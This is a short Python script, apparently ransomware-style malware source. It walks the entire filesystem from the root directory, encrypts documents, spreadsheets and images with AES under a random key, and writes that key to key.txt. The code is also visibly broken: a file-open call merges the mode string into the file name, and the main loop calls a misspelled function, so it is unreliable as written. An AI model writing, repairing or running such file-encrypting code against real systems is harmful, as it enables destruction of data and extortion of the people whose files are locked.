import os
import sys
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

START_DIR = '/'
EXTENSIONS = [".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".pptx"]

KEY = get_random_bytes(32)

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file_path + "wb") as f:
        f.write(cipher.nonce + tag + ciphertext)

for root, dirs, files in os.walk(START_DIR):
    for file in files:
        if any(file.endswith(ext) for ext in EXTENSIONS):
            full_path = os.path.join(root, file)
            try:
                encript_file(full_path, KEY)
                print(f"Encrypted: {full_path}")
            except Exception as e:
                print(f"Error encrypting {full_path}: {e}")

with open("key.txt", "wb") as key_file:
    key_file.write(base64.b64encode(KEY))
